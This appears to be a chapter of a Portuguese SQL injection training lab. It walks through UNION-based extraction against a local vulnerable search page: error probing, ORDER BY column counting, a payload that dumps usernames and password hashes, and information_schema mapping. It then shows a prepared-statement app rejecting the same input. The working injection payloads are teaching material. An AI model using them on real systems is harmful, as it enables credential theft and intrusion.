# 04 — Demo: UNION-based extraction (vazando usuários e senhas)

> 🎯 **Objetivo:** usar a busca de produtos para **ler a tabela `usuarios`** —
> extraindo `username` e `senha_hash` — e depois ver a app segura recusar o
> mesmo ataque.

O campo de busca fica em: <http://localhost:3000/busca> (app vulnerável).

---

## Ideia: o que é `UNION`?

`UNION` cola o resultado de **dois** `SELECT` num só. Analogia: é como grampear
a lista de outra planilha embaixo da sua, desde que **as duas tenham o mesmo
número de colunas**.

A busca deste laboratório roda:

```sql
SELECT id, nome, descricao, preco FROM produtos WHERE nome LIKE '%<termo>%'
```

São **4 colunas**. Se conseguirmos injetar `UNION SELECT a, b, c, d FROM usuarios`,
os dados de `usuarios` aparecem coladinhos na tabela de "produtos". Mas primeiro
precisamos ter **certeza** de que são 4 colunas.

---

## Passo 1 — Provocar um erro (opcional, mas didático)

1. Na busca, digite só uma aspa:

   ```
   '
   ```
2. Buscar.

**Resultado esperado:** a app vulnerável mostra o **erro cru do MySQL**, algo como:

```
Erro no MySQL: You have an error in your SQL syntax; ... near ''%'' ...
```

Isso já é um vazamento (error-based): confirma que o input entra na query e nos
dá pistas de como ela é montada.

---

## Passo 2 — Descobrir o número de colunas (`ORDER BY n`)

`ORDER BY 1` ordena pela 1ª coluna, `ORDER BY 2` pela 2ª... Se você pedir uma
coluna que **não existe**, o MySQL reclama. Vamos subindo até dar erro:

| Digite na busca | Resultado |
|-----------------|-----------|
| `' ORDER BY 1 -- ` | ✅ sem erro |
| `' ORDER BY 2 -- ` | ✅ sem erro |
| `' ORDER BY 3 -- ` | ✅ sem erro |
| `' ORDER BY 4 -- ` | ✅ sem erro |
| `' ORDER BY 5 -- ` | ❌ **erro**: `Unknown column '5' in 'order clause'` |

Parou de funcionar no **5** → a query tem **4 colunas**. 🎯

> 💡 Técnica alternativa: ir testando `UNION SELECT NULL`, depois
> `UNION SELECT NULL, NULL`, e assim por diante, até parar de dar erro. O número
> de `NULL`s que funciona é o número de colunas. `NULL` serve porque "encaixa"
> em qualquer tipo (texto, número, data).

Confirme com:

```
' UNION SELECT NULL, NULL, NULL, NULL -- 
```

**Resultado esperado:** sem erro, e aparece **uma linha em branco** entre os
produtos. Isso prova que o `UNION` de 4 colunas "encaixou".

---

## Passo 3 — O ataque principal: extrair credenciais

Agora trocamos os `NULL` pelos dados que queremos roubar da tabela `usuarios`:

```
' UNION SELECT 1, username, senha_hash, papel FROM usuarios -- 
```

- `1` só preenche a coluna `id` (poderia ser `NULL`);
- `username` cai na coluna que a tela chama de **nome**;
- `senha_hash` cai na coluna **descricao**;
- `papel` cai na coluna **preco** (o MySQL é tolerante com os tipos aqui).

**Resultado esperado:** a tabela de resultados passa a listar, junto dos
produtos, **todos os usuários e seus hashes de senha**:

| id | nome | descricao | preco |
|----|------|-----------|-------|
| 1 | admin | 240be518...c720a9 | admin |
| 1 | joana.silva | 4e7c...e2 | cliente |
| ... | ... | ... | ... |

💥 Vazamos a tabela de credenciais inteira pelo **campo de busca**.

> 🧹 **Dica de palco:** para esconder os produtos e mostrar **só** os dados
> roubados, comece o payload com algo que não existe, para a parte "produtos"
> voltar vazia:
>
> ```
> zzz' UNION SELECT 1, username, senha_hash, papel FROM usuarios -- 
> ```

---

## Passo 4 (bônus) — Mapear o banco pelo `information_schema`

O MySQL guarda um "catálogo" de si mesmo em `information_schema`. Dá para listar
tabelas e colunas — é assim que um atacante descobre onde estão os dados bons:

```
zzz' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema='sqli_lab' -- 
```

**Resultado esperado:** aparecem linhas como `usuarios / senha_hash`,
`usuarios / username`, `produtos / preco`, etc. É o mapa do tesouro.

---

## Passo 5 — E os hashes? (por que guardamos senha com hash)

O atacante saiu com `senha_hash`, não com a senha em texto. Isso **atrasa** o
ataque (ele ainda precisa "quebrar" o hash), mas não é imunidade:

- SHA-256 puro, **sem salt**, é rápido de testar em massa — senhas fracas caem
  rápido em ataques de dicionário/rainbow table.
- Em produção, o certo é usar um algoritmo **lento e com salt** próprio para
  senhas: **bcrypt**, **scrypt** ou **Argon2**.
- Aqui usamos SHA-256 só para a demo de UNION ficar realista. A lição é dupla:
  **(1)** não deixe a query vazar a tabela; **(2)** mesmo assim, guarde senhas
  com hashing forte, para o vazamento valer o mínimo possível.

---

## Passo 6 — O antídoto: mesmo ataque na app SEGURA

1. Abra a busca da app **segura**: <http://localhost:3001/busca>.
2. Cole o payload do Passo 3:

   ```
   ' UNION SELECT 1, username, senha_hash, papel FROM usuarios -- 
   ```
3. Buscar.

**Resultado esperado:** a tela procura, **literalmente**, produtos cujo nome
contenha o texto `' UNION SELECT 1, username, ... -- `. Como nenhum produto se
chama assim, o resultado é **"Nenhum produto encontrado."** Nada vaza.

Por quê? Prepared statement de novo:

```js
// ✅ SEGURO
const sql = 'SELECT id, nome, descricao, preco FROM produtos WHERE nome LIKE ?';
const [rows] = await pool.execute(sql, [`%${termo}%`]);
```

O payload inteiro vira o **valor** do `LIKE`. As palavras `UNION`, `SELECT` e as
aspas são tratadas como texto comum de busca — o MySQL nunca as executa como
comando. E, mesmo que por um milagre algo passasse, o usuário do banco
(`app_seguro`) só tem `SELECT` (doc 06): nada de escrever ou apagar.

---

## Tabela antes/depois

| Payload na busca | App vulnerável (:3000) | App segura (:3001) |
|------------------|------------------------|--------------------|
| `mouse` | lista mouses (normal) | lista mouses (normal) |
| `' ORDER BY 5 -- ` | ❌ vaza erro do MySQL | "Nenhum produto encontrado." |
| `' UNION SELECT 1, username, senha_hash, papel FROM usuarios -- ` | 💥 vaza usuários e hashes | "Nenhum produto encontrado." |

➡️ Próximo: [`05-mitigacao-prepared-statements.md`](05-mitigacao-prepared-statements.md)
— por que prepared statement resolve na raiz.
